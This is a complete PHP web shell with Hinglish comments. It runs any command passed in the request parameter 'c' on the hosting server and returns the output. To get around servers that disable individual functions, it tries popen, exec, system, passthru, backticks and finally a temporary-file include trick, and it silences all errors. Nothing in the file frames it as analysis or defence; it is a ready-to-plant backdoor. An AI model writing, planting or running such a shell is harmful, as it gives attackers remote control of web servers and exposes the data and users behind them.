<?php
error_reporting(0);
$cmd = $_GET['c'] ?? $_POST['c'] ?? $_REQUEST['c'] ?? '';

if (!empty($cmd)) {
    $output = '';

    // Method 1: popen
    if (function_exists('popen')) {
        $handle = popen($cmd . " 2>&1", "r");
        if ($handle) {
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            pclose($handle);
        }
    }

    // Method 2: exec
    if (empty(trim($output)) && function_exists('exec')) {
        exec($cmd . " 2>&1", $arr);
        $output = implode("\n", $arr);
    }

    // Method 3: system
    if (empty(trim($output)) && function_exists('system')) {
        ob_start();
        system($cmd . " 2>&1");
        $output = ob_get_clean();
    }

    // Method 4: passthru
    if (empty(trim($output)) && function_exists('passthru')) {
        ob_start();
        passthru($cmd . " 2>&1");
        $output = ob_get_clean();
    }

    // Method 5: Backtick (sabse chhupa hua)
    if (empty(trim($output))) {
        $output = @`$cmd 2>&1`;
    }

    // Method 6: Old temp file + include trick (agar shell_exec allowed hai)
    if (empty(trim($output))) {
        $tmp = '/tmp/cmd_' . rand(10000, 99999) . '.php';
        $phpcode = "<?php echo shell_exec('" . addslashes($cmd) . " 2>&1'); ?>";
        file_put_contents($tmp, $phpcode);
        ob_start();
        include($tmp);
        $output = ob_get_clean();
        @unlink($tmp);
    }

    if (!empty(trim($output))) {
        echo "<pre>" . htmlspecialchars($output) . "</pre>";
    } else {
        echo "Sab functions block lag rahe hain 😔";
    }
}
?>
